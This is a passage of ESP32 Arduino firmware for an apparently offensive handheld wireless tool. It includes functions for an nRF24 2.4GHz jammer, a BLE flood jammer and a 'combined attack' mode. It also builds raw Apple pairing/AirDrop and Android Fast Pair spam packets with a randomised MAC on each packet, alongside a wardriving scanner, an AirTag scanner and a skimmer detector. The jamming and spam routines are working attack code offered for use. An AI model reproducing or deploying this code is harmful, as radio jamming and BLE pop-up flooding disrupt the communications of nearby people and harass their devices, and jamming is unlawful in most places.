  tft.println("Check serial monitor");
  
  y += 15;
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("for live statistics");
  
  y += 30;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Mode: ");
  tft.setTextColor(dualNRFMode ? COLOR_GREEN : COLOR_CYAN);
  tft.println(dualNRFMode ? "DUAL" : "SINGLE");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Radio 1: ");
  tft.setTextColor(nrf1Available ? COLOR_GREEN : COLOR_RED);
  tft.println(nrf1Available ? "OK" : "OFF");
  
  y += 15;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("Radio 2: ");
  tft.setTextColor(nrf2Available ? COLOR_GREEN : COLOR_RED);
  tft.println(nrf2Available ? "OK" : "OFF");
  
  // Instructions
  int backY = 285;
  tft.drawFastHLine(0, backY, 240, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setTextSize(1);
  tft.setCursor(50, backY + 8);
  tft.print("Tap to stop jamming");
}

void drawBLEJammerActive() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("ble jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status display
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Status: ");
  tft.setTextColor(COLOR_ORANGE);
  tft.println("JAMMING ACTIVE");
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Mode: ");
  tft.setTextColor(COLOR_GREEN);
  tft.println(jammerModeText);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Packets sent: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Duration: ");
  tft.setTextColor(COLOR_TEXT);
  tft.printf("%d sec", (millis() - lastBLEJamTime) / 1000);
  
  y += 30;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  
  y += 10;
  tft.setTextSize(1);
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(30, y);
  tft.print("Flooding BLE spectrum with");
  
  y += 12;
  tft.setCursor(30, y);
  tft.print("random advertisements...");
  
  // Back/Stop button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_DARK_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(70, backY + 3);
  tft.print("[ESC] Stop & Back");
}

void updateNRFJammerDisplay() {
  // This function is called in loop() for live updates
  // Only update the dynamic stats area to prevent flicker
  
  if (currentState != NRF_JAM_ACTIVE || !nrfJammerActive) return;
  
  int statsY = HEADER_HEIGHT + 85;  // Position of stats area
  int leftColX = SIDE_MARGIN;
  int rightColX = 130;
  
  // Clear ONLY the stats numbers area (not labels)
  tft.fillRect(leftColX, statsY + 12, 120, 15, COLOR_BG);
  tft.fillRect(rightColX, statsY + 12, 110, 15, COLOR_BG);
  
  // Update hop count
  tft.setTextColor(COLOR_ORANGE);
  tft.setTextSize(1);
  tft.setCursor(leftColX, statsY + 12);
  tft.printf("%-8d", nrfJamPackets);
  
  // Update hops per second
  static unsigned long lastHopCount = 0;
  static unsigned long lastHopTime = 0;
  static uint32_t hopsPerSec = 0;
  if (millis() - lastHopTime > 1000) {
    hopsPerSec = nrfJamPackets - lastHopCount;
    lastHopCount = nrfJamPackets;
    lastHopTime = millis();
  }
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(leftColX + 55, statsY + 12);
  tft.printf("(%d/s)", hopsPerSec);
  
  // Update duration
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(rightColX, statsY + 12);
  unsigned long runtime = (millis() - lastNRFJamTime) / 1000;
  tft.printf("%-3d sec", runtime);
  
  // Update performance indicator
  int perfY = statsY + 42;
  tft.fillRect(leftColX + 5, perfY, 230, 12, COLOR_BG);
  
  if (hopsPerSec > 50000) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("EXCELLENT (50k+)");
  } else if (hopsPerSec > 30000) {
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("VERY GOOD (30k+)");
  } else if (hopsPerSec > 15000) {
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("GOOD (15k+)");
  } else if (hopsPerSec > 5000) {
    tft.setTextColor(COLOR_ORANGE);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("FAIR (5k+)");
  } else {
    tft.setTextColor(COLOR_RED);
    tft.setCursor(leftColX + 5, perfY);
    tft.print("WEAK (<5k)");
  }
}

// ==================== Combined Jammer ====================

void startCombinedJammer() {
  Serial.println("\n========== COMBINED ATTACK MODE ==========");
  Serial.println("[+] Starting nRF24 jammer (PRIMARY)...");
  startNRFJammer();
  delay(100);
  
  Serial.println("[+] Starting BLE spam (SECONDARY)...");
  startBLEJammer();
  
  currentState = WIFI_BLE_NRF_JAM;
  
  addToConsole("COMBINED ATTACK ACTIVE");
  Serial.println("[!] FULL SPECTRUM DISRUPTION");
  Serial.println("    - nRF24: Jamming 2.4GHz (disconnects)");
  Serial.println("    - BLE: Spamming discovery");
  Serial.println("========================================\n");
  
  displayCombinedJammer();
}

void stopCombinedJammer() {
  Serial.println("\n[*] Stopping combined jammer...");
  stopNRFJammer();
  stopBLEJammer();
  
  currentState = BLE_MENU;
  drawBLEMenu();
}

void displayCombinedJammer() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("combined jammer");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_ORANGE);
  tft.setCursor(SIDE_MARGIN, y);
  tft.println("[!] FULL SPECTRUM JAMMING");
  
  y += 25;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // BLE section
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] BLE Jammer:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", bleJamPackets);
  
  y += 20;
  
  // nRF24 section
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] nRF24 Jammer:");
  
  y += 15;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Packets: ");
  tft.setTextColor(COLOR_CYAN);
  tft.printf("%d", nrfJamPackets);
  
  y += 20;
  tft.drawFastHLine(0, y, 240, COLOR_DARK_GREEN);
  y += 10;
  
  // Total
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, y);
  tft.print("[*] Total packets: ");
  tft.setTextColor(COLOR_GREEN);
  tft.printf("%d", bleJamPackets + nrfJamPackets);
  
  y += 20;
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(SIDE_MARGIN + 10, y);
  tft.print("Jamming BLE + 2.4GHz RF");
  
  // Instructions
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== BLE Spam Functions ====================

void startAppleSpam() {
  if (appleSpamActive) return;
  
  Serial.println("\n[*] Starting Apple BLE Spam (AGGRESSIVE MODE)...");
  Serial.println("    Using raw ESP-IDF for maximum speed");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (androidSpamActive) stopAndroidSpam();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT (ESP-IDF)
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  // Set to NON-CONNECTABLE for spam
  esp_ble_gap_set_device_name("");
  
  appleSpamActive = true;
  appleSpamCount = 0;
  lastAppleSpam = 0;
  
  Serial.println("[+] Apple spam started (AGGRESSIVE)");
  Serial.println("    Flooding at maximum rate!");
  addToConsole("Apple spam: AGGRESSIVE");
}

void stopAppleSpam() {
  if (!appleSpamActive) return;
  
  appleSpamActive = false;
  Serial.println("\n[*] Stopping Apple spam...");
  
  // Stop advertising
  esp_ble_gap_stop_advertising();
  delay(100);
  
  // Shutdown BLE stack
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  
  delay(200);
  
  Serial.printf("[+] Stopped (%d sent)\n", appleSpamCount);
  addToConsole("Apple spam stopped");
}

void performAppleSpam() {
  if (!appleSpamActive) return;
  
  // AGGRESSIVE: 20ms cycle (50 packets/second per message type)
  if (millis() - lastAppleSpam < 20) return;
  lastAppleSpam = millis();
  
  static uint8_t msgRotation = 0;
  
  // Rotate through ALL message types rapidly
  msgRotation = (msgRotation + 1) % 15;
  
  uint8_t adv_data[31];
  uint8_t adv_len = 0;
  
  // BLE Flags
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x01;
  adv_data[adv_len++] = 0x1A;  // LE General + No BR/EDR
  
  // Apple Company ID
  adv_data[adv_len++] = 0x1B;  // Length (will adjust)
  adv_data[adv_len++] = 0xFF;  // Manufacturer Specific
  adv_data[adv_len++] = 0x4C;  // Apple
  adv_data[adv_len++] = 0x00;
  
  if (msgRotation < 10) {
    // PROXIMITY PAIRING - All device types
    uint16_t model = apple_models[msgRotation % 10];
    
    adv_data[3] = 0x1B;  // Update length
    adv_data[adv_len++] = 0x07;  // Proximity Pairing
    adv_data[adv_len++] = 0x19;  // Length
    adv_data[adv_len++] = 0x01;  // Status
    adv_data[adv_len++] = (model >> 8) & 0xFF;
    adv_data[adv_len++] = model & 0xFF;
    adv_data[adv_len++] = 0x00;  // Status
    
    // Random MAC
    for (int i = 0; i < 6; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
    
    adv_data[adv_len++] = 0x00;  // Hint
    
    // Reserved
    for (int i = 0; i < 8; i++) {
      adv_data[adv_len++] = 0x00;
    }
    
    // Battery (random)
    adv_data[adv_len++] = random(20, 100);
    adv_data[adv_len++] = random(20, 100);
    adv_data[adv_len++] = random(20, 100);
    
  } else if (msgRotation < 13) {
    // NEARBY ACTION - All action types
    uint8_t action = apple_actions[(msgRotation - 10) % 9];
    
    adv_data[3] = 0x08;  // Update length
    adv_data[adv_len++] = 0x0F;  // Nearby Action
    adv_data[adv_len++] = 0x05;  // Length
    adv_data[adv_len++] = 0x00;  // Flags
    adv_data[adv_len++] = action;
    
    // Auth tag
    for (int i = 0; i < 3; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
    
  } else {
    // AIRDROP
    adv_data[3] = 0x15;  // Update length
    adv_data[adv_len++] = 0x05;  // AirDrop
    adv_data[adv_len++] = 0x12;  // Length
    adv_data[adv_len++] = 0x00;  // Flags
    
    // Zero hash
    for (int i = 0; i < 8; i++) {
      adv_data[adv_len++] = 0x00;
    }
    
    // Random data
    for (int i = 0; i < 9; i++) {
      adv_data[adv_len++] = random(0, 256);
    }
  }
  
  // CRITICAL: Set random MAC address for each packet
  uint8_t random_addr[6];
  for (int i = 0; i < 6; i++) {
    random_addr[i] = random(0, 256);
  }
  random_addr[0] |= 0xC0;  // Set random address type
  
  esp_ble_gap_set_rand_addr(random_addr);
  
  // Configure advertising parameters (fast)
  esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20,        // 20ms
    .adv_int_max = 0x40,        // 40ms
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .peer_addr = {0},
    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };
  
  // Send the packet
  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
  esp_ble_gap_start_advertising(&adv_params);
  
  appleSpamCount++;
  
  // Quick stop for next packet (10ms later)
  delayMicroseconds(10000);
  esp_ble_gap_stop_advertising();
}

void startAndroidSpam() {
  if (androidSpamActive) return;
  
  Serial.println("\n[*] Starting Android BLE Spam (AGGRESSIVE MODE)...");
  Serial.println("    Using raw ESP-IDF for maximum speed");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (appleSpamActive) stopAppleSpam();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT (ESP-IDF)
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  esp_ble_gap_set_device_name("");
  
  androidSpamActive = true;
  androidSpamCount = 0;
  lastAndroidSpam = 0;
  
  Serial.println("[+] Android spam started (AGGRESSIVE)");
  Serial.println("    Flooding Fast Pair at maximum rate!");
  addToConsole("Android spam: AGGRESSIVE");
}

void stopAndroidSpam() {
  if (!androidSpamActive) return;
  
  androidSpamActive = false;
  Serial.println("\n[*] Stopping Android spam...");
  
  // Stop advertising
  esp_ble_gap_stop_advertising();
  delay(100);
  
  // Shutdown BLE stack
  esp_bluedroid_disable();
  esp_bluedroid_deinit();
  esp_bt_controller_disable();
  esp_bt_controller_deinit();
  
  delay(200);
  
  Serial.printf("[+] Stopped (%d sent)\n", androidSpamCount);
  addToConsole("Android spam stopped");
}

void performAndroidSpam() {
  if (!androidSpamActive) return;
  
  // AGGRESSIVE: 20ms cycle (50 packets/second)
  if (millis() - lastAndroidSpam < 20) return;
  lastAndroidSpam = millis();
  
  // Rotate through models rapidly
  static uint8_t modelIndex = 0;
  modelIndex = (modelIndex + 1) % 13;
  
  uint32_t model = android_models[modelIndex];
  
  uint8_t adv_data[31];
  uint8_t adv_len = 0;
  
  // BLE Flags
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x01;
  adv_data[adv_len++] = 0x1A;
  
  // Fast Pair Service UUID
  adv_data[adv_len++] = 0x03;
  adv_data[adv_len++] = 0x03;
  adv_data[adv_len++] = 0x2C;
  adv_data[adv_len++] = 0xFE;
  
  // Fast Pair Service Data
  adv_data[adv_len++] = 0x06;  // Length
  adv_data[adv_len++] = 0x16;  // Service Data
  adv_data[adv_len++] = 0x2C;  // Fast Pair UUID
  adv_data[adv_len++] = 0xFE;
  
  // Model ID (3 bytes)
  adv_data[adv_len++] = (model >> 16) & 0xFF;
  adv_data[adv_len++] = (model >> 8) & 0xFF;
  adv_data[adv_len++] = model & 0xFF;
  
  // TX Power
  adv_data[adv_len++] = 0x02;
  adv_data[adv_len++] = 0x0A;
  adv_data[adv_len++] = 0x00;
  
  // Random MAC for each packet
  uint8_t random_addr[6];
  for (int i = 0; i < 6; i++) {
    random_addr[i] = random(0, 256);
  }
  random_addr[0] |= 0xC0;
  
  esp_ble_gap_set_rand_addr(random_addr);
  
  // Fast advertising parameters
  esp_ble_adv_params_t adv_params = {
    .adv_int_min = 0x20,        // 20ms
    .adv_int_max = 0x40,        // 40ms
    .adv_type = ADV_TYPE_NONCONN_IND,
    .own_addr_type = BLE_ADDR_TYPE_RANDOM,
    .peer_addr = {0},
    .peer_addr_type = BLE_ADDR_TYPE_PUBLIC,
    .channel_map = ADV_CHNL_ALL,
    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
  };
  
  // Send packet
  esp_ble_gap_config_adv_data_raw(adv_data, adv_len);
  esp_ble_gap_start_advertising(&adv_params);
  
  androidSpamCount++;
  
  // Quick stop (10ms)
  delayMicroseconds(10000);
  esp_ble_gap_stop_advertising();
}

// ==================== AirTag Scanner ====================

void startAirTagScanner() {
  currentState = AIRTAG_SCANNER;
  airTagCount = 0;
  
  addToConsole("AirTag scan started");
  
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  
  // Display results screen FIRST
  displayAirTagResults();
  
  // Start async scan
  pBLEScan->start(10, nullptr, false);
}

// ==================== COMBINED AGGRESSIVE SPAM ====================
void startCombinedSpam() {
  Serial.println("\n[*] Starting COMBINED SPAM (ULTRA AGGRESSIVE)...");
  Serial.println("    Apple + Android flooding simultaneously!");
  
  // Stop conflicting operations
  if (nrfJammerActive) {
    Serial.println("[*] Pausing nRF24...");
    nrfJammerActive = false;
    delay(100);
  }
  if (bleJammerActive) stopBLEJammer();
  if (continuousBLEScan) {
    continuousBLEScan = false;
    if (pBLEScan != nullptr) pBLEScan->stop();
    delay(100);
  }
  
  // Force complete BLE shutdown
  if (BLEDevice::getInitialized()) {
    BLEDevice::deinit(true);
    delay(300);
  }
  
  // LOW-LEVEL BLE INIT
  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
  esp_bt_controller_init(&bt_cfg);
  esp_bt_controller_enable(ESP_BT_MODE_BLE);
  
  esp_bluedroid_init();
  esp_bluedroid_enable();
  
  esp_ble_gap_set_device_name("");
  
  appleSpamActive = true;
  androidSpamActive = true;
  appleSpamCount = 0;
  androidSpamCount = 0;
  lastAppleSpam = 0;
  lastAndroidSpam = 0;
  
  Serial.println("[+] COMBINED SPAM ACTIVE!");
  Serial.println("    Alternating Apple/Android at 100 pkt/sec");
  addToConsole("COMBINED: ULTRA AGGRESSIVE");
}

void performCombinedSpam() {
  if (!appleSpamActive && !androidSpamActive) return;
  
  // ULTRA AGGRESSIVE: 10ms alternating
  static unsigned long lastSpam = 0;
  static bool doApple = true;
  
  if (millis() - lastSpam < 10) return;
  lastSpam = millis();
  
  // Alternate between Apple and Android
  if (doApple) {
    performAppleSpam();
  } else {
    performAndroidSpam();
  }
  
  doApple = !doApple;
}

void displayAirTagResults() {
  currentState = AIRTAG_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("airtag scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(airTagCount > 0 ? COLOR_ORANGE : COLOR_GREEN);
  tft.printf("%d", airTagCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("ADDRESS");
  tft.setCursor(110, listY);
  tft.print("RSSI");
  tft.setCursor(150, listY);
  tft.print("SEEN");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  if (airTagCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("No AirTags detected yet...");
  } else {
    // Pagination
    const int MAX_AIRTAG_DISPLAY = 9;
    
    if (airtagScrollOffset >= airTagCount) {
      airtagScrollOffset = max(0, airTagCount - MAX_AIRTAG_DISPLAY);
    }
    
    int displayCount = min(airTagCount - airtagScrollOffset, MAX_AIRTAG_DISPLAY);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = airtagScrollOffset + i;
      int y = listY + (i * 26);
      
      // Warning indicator
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print("[!]");
      
      // Address (shortened)
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 20, y + 2);
      String addr = airTags[idx].address;
      if (addr.length() > 12) addr = addr.substring(0, 12);
      tft.print(addr);
      
      // RSSI
      tft.setTextColor(COLOR_YELLOW);
      tft.setCursor(110, y + 2);
      tft.printf("%d", airTags[idx].rssi);
      
      // Detection count
      tft.setTextColor(COLOR_CYAN);
      tft.setCursor(150, y + 2);
      tft.printf("%dx", airTags[idx].detectionCount);
      
      // Full address on second line
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 20, y + 12);
      tft.print(airTags[idx].address);
    }
    
    // Scroll indicator
    if (airTagCount > MAX_AIRTAG_DISPLAY) {
      int scrollY = listY + (MAX_AIRTAG_DISPLAY * 26) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setCursor(85, scrollY);
      tft.printf("[%d-%d/%d]", 
                 airtagScrollOffset + 1, 
                 airtagScrollOffset + displayCount, 
                 airTagCount);
    }
  }
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== Skimmer Detector ====================

void startSkimmerDetector() {
  currentState = SKIMMER_DETECTOR;
  skimmerCount = 0;
  
  addToConsole("Skimmer scan started");
  
  // Initialize BLE
  BLEDevice::init("");
  pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true);
  
  // Display results screen FIRST
  displaySkimmerResults();
  
  // Start async scan
  pBLEScan->start(8, nullptr, false);
}


void displaySkimmerResults() {
  currentState = SKIMMER_RESULTS;
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("skimmer scan");
  
  // Live indicator
  static bool blink = false;
  blink = !blink;
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  // Status line
  tft.setTextSize(1);
  tft.setTextColor(COLOR_CYAN);
  tft.setCursor(SIDE_MARGIN, HEADER_HEIGHT + 5);
  tft.print("Scanning...");
  
  tft.setTextColor(COLOR_TEXT);
  tft.setCursor(120, HEADER_HEIGHT + 5);
  tft.printf("Found: ");
  tft.setTextColor(skimmerCount > 0 ? COLOR_RED : COLOR_GREEN);
  tft.printf("%d", skimmerCount);
  
  // Column headers
  int listY = HEADER_HEIGHT + 20;
  tft.drawFastHLine(0, listY - 2, 240, COLOR_DARK_GREEN);
  
  tft.setTextColor(COLOR_DARK_GREEN);
  tft.setCursor(SIDE_MARGIN, listY);
  tft.print("DEVICE");
  tft.setCursor(140, listY);
  tft.print("RSSI");
  
  tft.drawFastHLine(0, listY + 12, 240, COLOR_DARK_GREEN);
  listY += 15;
  
  if (skimmerCount == 0) {
    tft.setTextSize(1);
    tft.setTextColor(COLOR_GREEN);
    tft.setCursor(SIDE_MARGIN, listY + 40);
    tft.print("All clear - no skimmers");
    
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, listY + 55);
    tft.print("detected nearby");
  } else {
    // Pagination
    const int MAX_SKIMMER_DISPLAY = 9;
    
    if (skimmerScrollOffset >= skimmerCount) {
      skimmerScrollOffset = max(0, skimmerCount - MAX_SKIMMER_DISPLAY);
    }
    
    int displayCount = min(skimmerCount - skimmerScrollOffset, MAX_SKIMMER_DISPLAY);
    
    for (int i = 0; i < displayCount; i++) {
      int idx = skimmerScrollOffset + i;
      int y = listY + (i * 26);
      
      // Warning indicator
      tft.setTextColor(COLOR_RED);
      tft.setCursor(SIDE_MARGIN, y + 2);
      tft.print("[!]");
      
      // Device name
      tft.setTextColor(COLOR_TEXT);
      tft.setCursor(SIDE_MARGIN + 20, y + 2);
      String name = skimmers[idx].name;
      if (name.length() > 15) name = name.substring(0, 14) + "~";
      tft.print(name);
      
      // RSSI
      tft.setTextColor(COLOR_ORANGE);
      tft.setCursor(140, y + 2);
      tft.printf("%d", skimmers[idx].rssi);
      
      // Warning
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN + 20, y + 12);
      tft.print("Very close!");
    }
    
    // Scroll indicator
    if (skimmerCount > MAX_SKIMMER_DISPLAY) {
      int scrollY = listY + (MAX_SKIMMER_DISPLAY * 26) + 5;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setTextSize(1);
      tft.setCursor(85, scrollY);
      tft.printf("[%d-%d/%d]", 
                 skimmerScrollOffset + 1, 
                 skimmerScrollOffset + displayCount, 
                 skimmerCount);
    }
  }
  
  // Back button
  int backY = 305;
  tft.drawFastHLine(0, backY - 2, 240, COLOR_GREEN);
  tft.setTextColor(COLOR_RED);
  tft.setCursor(85, backY + 3);
  tft.print("[ESC] Back");
}

// ==================== Wardriving ====================

void startWardriving() {
  currentState = WARDRIVING_MODE;
  
  // Reset stats
  wardrivingStats.totalAPs = 0;
  wardrivingStats.openAPs = 0;
  wardrivingStats.securedAPs = 0;
  wardrivingStats.strongestSSID = "";
  wardrivingStats.strongestRSSI = -100;
  
  addToConsole("Wardriving started");
  
  // Display results screen FIRST
  displayWardrivingResults();
  
  // Start async WiFi scan
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  WiFi.scanNetworks(true);
}

void displayWardrivingResults() {
  tft.fillScreen(COLOR_BG);
  drawTerminalHeader("wardriving");
  esp_task_wdt_reset();

  // Heap monitoring
  static unsigned long lastHeapCheck = 0;
  if (millis() - lastHeapCheck > 10000) {
    if (ESP.getFreeHeap() < 20000) {
      addToConsole("WARN: Low memory!");
      Serial.printf("⚠️  Free heap: %d bytes\n", ESP.getFreeHeap());
    }
    lastHeapCheck = millis();
  }
  
  static unsigned long lastBlink = 0;
  static bool blink = false;
  if (millis() - lastBlink > 500) {
    blink = !blink;
    lastBlink = millis();
  }
  tft.fillCircle(220, 12, 3, blink ? COLOR_GREEN : COLOR_DARK_GREEN);
  
  tft.setTextSize(1);
  tft.setTextColor(COLOR_DARK_GREEN);
  
  int y = HEADER_HEIGHT + 15;
  
  // Check if scan is complete
  int scanStatus = WiFi.scanComplete();
  
  if (scanStatus == WIFI_SCAN_RUNNING || scanStatus == WIFI_SCAN_FAILED) {
    // Still scanning
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Scanning networks...");
    
    y += 20;
    tft.setTextColor(COLOR_TEXT);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("This may take a few seconds");
  } else {
    // Scan complete - process results
    if (scanStatus > 0 && wardrivingStats.totalAPs == 0) {
      wardrivingStats.totalAPs = scanStatus;
      
      for (int i = 0; i < scanStatus; i++) {
        if (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) {
          wardrivingStats.openAPs++;
        } else {
          wardrivingStats.securedAPs++;
        }
        
        int rssi = WiFi.RSSI(i);
        if (rssi > wardrivingStats.strongestRSSI) {
          wardrivingStats.strongestRSSI = rssi;
          wardrivingStats.strongestSSID = WiFi.SSID(i);
        }
      }
    }
    
    // Display stats (clean terminal style - no backgrounds)
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Total APs: ");
    tft.setTextColor(COLOR_CYAN);
    tft.println(wardrivingStats.totalAPs);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Open: ");
    tft.setTextColor(COLOR_GREEN);
    tft.println(wardrivingStats.openAPs);
    
    y += 15;
    tft.setTextColor(COLOR_DARK_GREEN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.print("[*] Secured: ");
    tft.setTextColor(COLOR_ORANGE);
    tft.println(wardrivingStats.securedAPs);
    
    // Security percentage
    y += 20;
    if (wardrivingStats.totalAPs > 0) {
      int securePercent = (wardrivingStats.securedAPs * 100) / wardrivingStats.totalAPs;
      tft.setTextColor(COLOR_DARK_GREEN);
      tft.setCursor(SIDE_MARGIN, y);
      tft.print("[*] Security rate: ");
      tft.setTextColor(securePercent > 70 ? COLOR_GREEN : COLOR_YELLOW);
      tft.printf("%d%%", securePercent);
    }
    
    // Strongest signal
    y += 25;
    tft.setTextColor(COLOR_CYAN);
    tft.setCursor(SIDE_MARGIN, y);
    tft.println("Strongest signal:");
    
    y += 15;
